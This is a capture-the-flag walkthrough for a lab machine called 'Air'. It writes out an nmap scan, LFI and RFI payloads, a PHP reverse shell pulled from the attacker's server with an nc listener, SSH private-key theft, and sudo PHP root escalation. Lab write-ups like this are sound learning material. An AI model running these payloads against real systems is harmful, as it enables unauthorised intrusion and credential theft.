## Air - A Guia Anonima CTF Test

>[!IMPORTANT]
>**10.10.11.250** is my Target IP, but it is randomly generate each time the TryHackMe machine starts!<br>
>**X.X.X.X** is my Attack Machine IP address, so you will need to check and adjust according your environment.

Used tools:
- Nmap
- nc (netcat)
- Python

We started with a simple port scan using Nmap on the target..  
```Shell
#This generally gives us some open ports - top 1000
nmap -sS [Target_IP] -v

#Then specify and get more info
nmap -sV [Target_IP] -p 22,80 -v

#Results:
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
Next, we tested the web server directly and were redirected to /air/:  
http://10.10.11.250/air/

While navigating, we notice a possible LFI Vulnerabilty at the URL:  
http://10.10.11.250/air/?page=home.html

Testing LFI - _**Success / Vulnerable**_:  
http://10.10.11.250/air/?page=../../../../etc/passwd

We were able to enumerate some users:  
```Shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
[...]
arkham:x:1000:1000:arkham,,,:/home/arkham:/bin/bash
```
Now Testing RFI - _**Success / Vulnerable**_:  
Open a terminal and start a web server using Python:  
```Shell
python -m http.server 4444
```
Go to URL and try:  
http://10.10.11.250/air/?page=http://X.X.X.X:4444/

Check the Python web server to confirm it receives the request from the target machine.  

---

**Now, getting the Reverse Shell:**  
- Write a PHP Reverse Shell; (Recommended: [pentestmonkey repo](https://github.com/pentestmonkey/php-reverse-shell/blob/8aa37ebe03d896b432c4b4469028e2bed75785f1/php-reverse-shell.php) )
- Start a Web Server with Python;
- Start a listening TCP connection with nc;

```Shell
#Adjust the PHP Reverse Shell lines 49 and 50 with your proper IP and Port (from listening term/nc)
In this example, my file is my_reverse_shell.php
$ip = 'X.X.X.X';  // CHANGE THIS
$port = 9898;       // CHANGE THIS

#Open new Terminal (I'll call it: Term1)
nc -nlvp 9898

#In another Terminal, in the path with the PHP Rev. Shell file
python -m http.server 4444
```
In the browser:  
http://10.10.11.250/air/?page=http://X.X.X.X:4444/my_reverse_shell.php

Now, get the shell at _Term1_
```Shell
#Look for files
ls /opt
#output:
bkp

ls -l /opt/bkp
#output:
-r--r--r--r 1 root root 1679 May 12 18:52 id_rsa
#This is a Private key used for SSH connections. Sometimes the ssh config does not require password authentication.

cat /opt/bkp/id_rsa
#now copy the contect and create a file on your machine, then paste the data and save it.
nano sshkey
[...paste data and save...]
chmod 600 sshkey
```

Trying to login with SSH
```Shell
ssh arkham@10.10.11.250 -i sshkey
#Output:
(Some banner SSH info and LOGIN SUCCESS with arkham user)
```

**The First Flag:**
```Shell
cat /home/arkham/user.txt
```

The second flag (room description) needs a root privilege.  
Now, start the Privilege Escalation:  
```Shell
#checking the sudo permissions
sudo -l
#output:
Matching Defaults entries for arkham on guiaanonima:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User arkham may run the following commands on guiaanonima:
  (ALL : ALL) ALL
  (root) NOPASSWD: /usr/bin/php
#The last line shows that PHP can be executed as root without a password request for user arkham. This is a point for escalation.
```

On [gtfobins](https://gtfobins.github.io/gtfobins/php/) ,under the PHP option, we can see a SUDO category:  
>If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```Shell
#Now, execute and get the root privilege
CMD="/bin/sh"
sudo php -r "system('$CMD');"

whoami
#output:
root
```

The Second flag:
```Shell
cat /root/root.txt
```
